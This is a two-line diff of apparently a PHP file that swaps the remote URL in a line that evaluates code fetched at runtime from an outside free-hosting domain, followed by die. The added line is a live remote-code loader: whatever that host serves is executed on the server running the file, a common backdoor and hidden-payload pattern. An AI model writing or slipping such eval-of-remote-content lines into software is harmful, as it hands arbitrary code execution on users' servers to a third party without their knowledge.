@@ -1,2 +1,2 @@
-eval(_valer(getlink("https://dhtool.x10.mx/hash/dhtool-282801.php")));
+eval(_valer(getlink("https://dhtool.ygto.com/hashv2/dhtool-282801.php")));
 die;
